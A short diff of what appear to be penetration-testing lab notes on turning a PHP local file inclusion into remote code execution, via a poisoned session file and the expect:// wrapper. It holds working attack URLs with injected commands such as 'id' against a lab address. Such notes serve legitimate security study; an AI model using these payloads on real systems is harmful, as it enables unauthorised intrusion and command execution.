@@ -40,7 +40,7 @@ Poison the Cookie
 * Inject code where id is. Ie cmd=ifconfig
 > http://46.101.91.21:32484/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage&cmd=id
 
- * Other ways to execude remote code - There is 3
+* Other ways to execude remote code - There is 3
    * Execute code where id is (1)
    > http://46.101.91.21:32484/index.php?language=expect://id
    * Get the base64 digit (2)
